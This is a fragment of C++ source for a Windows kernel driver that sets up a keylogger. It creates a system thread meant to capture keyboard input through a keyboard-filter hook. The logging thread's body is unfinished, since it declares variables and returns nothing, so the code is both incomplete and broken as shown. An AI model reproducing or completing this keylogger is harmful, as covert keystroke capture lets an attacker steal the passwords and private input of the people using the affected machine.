extern "C" {
	#include <ntddk.h>
}
#include "ntddkbd.h"
#include <kbdmou.h>
#include "Keysniff.H"
#include "KbdHook.h"

NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject) {
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	pKeyboardDeviceExtension->bThreadTerminate = false;
	
	HANDLE hThread;
	NTSTATUS status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, ThreadKeyLogger, pKeyboardDeviceExtension);
	
	if (!NT_SUCCESS(status)) return status;

	DbgPrint("Key logger thread created.\n");

	ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pKeyboardDeviceExtension->pThreadObj, NULL);
	
	DbgPrint("Key logger thread initialized; pThreadObject =  %x\n", &pKeyboardDeviceExtension->pThreadObj);
	
	ZwClose(hThread);

	return status;
}

NTSTATUS ThreadKeyLogger(IN PVOID pContext) {
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
	PDEVICE_OBJECT pKeyboardDeviceOjbect = pKeyboardDeviceExtension->pKeyboardDevice;

	PLIST_ENTRY pListEntry;
	KEY_DATA* kData;


}
